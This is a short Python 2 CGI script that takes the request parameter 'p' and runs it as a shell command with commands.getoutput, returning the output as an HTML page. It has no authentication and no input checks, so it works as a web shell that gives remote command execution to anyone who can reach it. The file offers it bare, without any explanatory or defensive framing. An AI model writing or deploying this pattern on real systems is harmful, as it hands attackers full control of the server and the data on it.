#!/usr/bin/python2

import cgi
import  cgitb
import  commands,os,time
cgitb.enable()

print  "content-type:text/html"
print  ""

data=cgi.FieldStorage()

c=data.getvalue('p')

print  "<pre>"
print  commands.getoutput(c)
print  "</pre>"






